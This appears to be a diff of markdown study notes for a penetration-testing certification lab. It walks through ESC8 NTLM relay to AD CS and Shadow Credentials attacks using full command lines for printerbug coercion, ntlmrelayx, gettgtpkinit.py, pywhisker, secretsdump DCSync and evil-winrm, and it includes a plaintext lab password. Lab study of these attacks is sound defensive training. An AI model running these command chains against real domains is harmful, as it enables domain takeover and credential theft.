+                        ▼
+              🎯 DOMAIN CONTROLLER
+                 10.129.234.174
+                        │
+                        │ NTLM authentication
+                        ▼
+                 💻 ATTACKER
+                  ntlmrelayx
+                        │
+                        │ Relay
+                        ▼
+                 🏢 AD CS / CA
+                 10.129.234.172
+                        │
+                        │ Certificate
+                        ▼
+                    DC01.pfx
+                        │
+                        │ PKINIT
+                        ▼
+              🎯 DOMAIN CONTROLLER
+                 10.129.234.174
+                        │
+                        │ TGT
+                        ▼
+                /tmp/dc.ccache
+                        │
+                        ▼
+              Pass-the-Ticket
+                        │
+                        ▼
+                 DCSync / Access
 ```
 
-## 👻 Shadow Credentials
+### 🔑 Commands
 
-```text
-      Write permission
-             │
-             ▼
-msDS-KeyCredentialLink
-             │
-             │ Add public key
-             ▼
-       Victim account
-             │
-             │ Certificate + private key
-             ▼
-           PKINIT
-             │
-             ▼
-        Victim TGT
-             │
-             ▼
-      Pass-the-Ticket
-             │
-             ▼
-       Remote access
-```
-
----
-
-# ⚡ 23. CPTS Cheat Sheet
-
-### 🔐 PKINIT
-
-```text
-Public-key cryptography
-        ↓
-Initial Kerberos authentication
-        ↓
-Certificate
-        ↓
-TGT
-```
-
-### 🔥 ESC8
-
-```text
-NTLM Relay
-   ↓
-AD CS Web Enrollment
-   ↓
-Certificate
-   ↓
-gettgtpkinit.py
-   ↓
-TGT
-```
-
-### 👻 Shadow Credentials
-
-```text
-Write msDS-KeyCredentialLink
-   ↓
-pywhisker
-   ↓
-PFX
-   ↓
-gettgtpkinit.py
-   ↓
-TGT
-```
-
-### 🎫 Reuse TGT
+**1. Relay to AD CS:**
 
 ```bash
-export KRB5CCNAME=/tmp/<ticket>.ccache
+ntlmrelayx.py -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication --http-port 8080
 ```
 
-Verify:
+`10.129.234.172` = 🏢 **AD CS / CA**
+
+**2. Coerce DC authentication:**
+
+```bash
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.16.12
+```
+
+`10.129.234.174` = 🎯 **DC**
+
+`10.10.16.12` = 💻 **Attacker**
+
+**3. Request TGT:**
+
+```bash
+python3 gettgtpkinit.py -cert-pfx /root/DC01.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
+```
+
+`10.129.234.174` = 🎯 **DC/KDC**
+
+**4. Load ticket:**
+
+```bash
+export KRB5CCNAME=/tmp/dc.ccache
+```
+
+**5. Verify ticket:**
 
 ```bash
 klist
 ```
 
-### 💀 DCSync
+**6. DCSync:**
 
 ```bash
-impacket-secretsdump -k -no-pass -dc-ip <DC-IP> -just-dc-user Administrator '<DOMAIN>/<ACCOUNT>'@<DC-FQDN>
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ```
 
-### 🖥️ Kerberos WinRM
-
-```bash
-evil-winrm -i <DC-FQDN> -r <DOMAIN>
-```
+`10.129.234.174` = 🎯 **DC**
 
 ---
 
-# 🎯 24. What to Remember for CPTS
-
-> [!success]  
-> **The most important concept is the conversion chain:**
-> 
-> **Certificate → PKINIT → TGT → Pass-the-Ticket**
-
-Remember the two major ways you may obtain the certificate:
+# 🧠 25. Complete Shadow Credentials Cheat Sheet
 
 ```text
-ESC8
-NTLM Relay → AD CS → Certificate
-```
-
-and:
-
-```text
-Shadow Credentials
-Write msDS-KeyCredentialLink → Certificate
-```
-
-Then:
-
-```text
-Certificate
+BloodHound
+    ↓
+AddKeyCredentialLink
+    ↓
+Write msDS-KeyCredentialLink
+    ↓
+pywhisker
+    ↓
+Certificate + PFX
     ↓
 gettgtpkinit.py
+    ↓
+Victim TGT
     ↓
 .ccache
     ↓
@@ -1016,9 +1012,137 @@ KRB5CCNAME
 Kerberos authentication
 ```
 
-### 🧠 One-line memory hook
+### 🔑 Commands
 
-> **“Get a certificate, turn it into a TGT, then treat the TGT like any other Kerberos ticket.”**
+**1. Add Shadow Credential:**
+
+```bash
+pywhisker --dc-ip <DC-IP> -d INLANEFREIGHT.LOCAL -u <attacker> -p '<password>' --target <victim> --action add
+```
+
+`<DC-IP>` = 🎯 **Domain Controller**
+
+**2. Request victim TGT:**
+
+```bash
+python3 gettgtpkinit.py -cert-pfx <victim.pfx> -pfx-pass '<PFX-password>' -dc-ip <DC-IP> INLANEFREIGHT.LOCAL/<victim> /tmp/<victim>.ccache
+```
+
+`<DC-IP>` = 🎯 **Domain Controller/KDC**
+
+**3. Load TGT:**
+
+```bash
+export KRB5CCNAME=/tmp/<victim>.ccache
+```
+
+**4. Verify:**
+
+```bash
+klist
+```
+
+**5. Use Kerberos access:**
+
+```bash
+evil-winrm -i <target> -r inlanefreight.local
+```
+
+`<target>` = 🎯 **Remote Windows machine**
+
+---
+
+# 🎯 26. Final CPTS Mental Model
+
+> [!success]  
+> **Pass-the-Certificate is easiest to remember as a conversion chain.**
+
+```text
+             🔑 CERTIFICATE
+                    │
+                    ▼
+                 PKINIT
+                    │
+                    ▼
+              🎟️ TGT / .ccache
+                    │
+                    ▼
+          🎫 PASS-THE-TICKET
+                    │
+          ┌─────────┴─────────┐
+          ▼                   ▼
+      🖥️ WinRM             💀 DCSync
+```
+
+### 🔥 ESC8
+
+```text
+Coerce
+  ↓
+NTLM Relay
+  ↓
+AD CS
+  ↓
+Certificate
+  ↓
+PKINIT
+  ↓
+TGT
+```
+
+### 👻 Shadow Credentials
+
+```text
+Write msDS-KeyCredentialLink
+  ↓
+Add public key
+  ↓
+Certificate / PFX
+  ↓
+PKINIT
+  ↓
+TGT
+```
+
+### 📌 The IP rule
+
+```text
+ntlmrelayx
+    ↓
+AD CS IP
+
+printerbug
+    ↓
+Target/DC IP + Attacker IP
+
+gettgtpkinit.py
+    ↓
+DC/KDC IP
+
+secretsdump
+    ↓
+DC IP
+
+evil-winrm
+    ↓
+Remote Windows target
+```
 
 > [!important]  
-> Once `gettgtpkinit.py` gives you a `.ccache`, **you are effectively back in Pass-the-Ticket territory**. The certificate was the mechanism used to obtain the Kerberos TGT; the TGT is what you subsequently use for Kerberos authentication and lateral movement.
+> **The single most important distinction from this lab:**
+> 
+> **AD CS IP ≠ necessarily DC IP.**
+> 
+> The **AD CS server** issues the certificate, while the **Domain Controller/KDC** handles the Kerberos PKINIT request.
+> 
+> In the lab:
+> 
+> `10.129.234.172` → **AD CS / CA**
+> 
+> `10.129.234.174` → **Domain Controller / KDC**
+> 
+> `10.10.16.12` → **Attacker**
+
+### 🧠 One-line memory hook
+
+> **“Relay to the CA, get the certificate, ask the DC/KDC for the TGT, then use the TGT like any other Kerberos ticket.”**
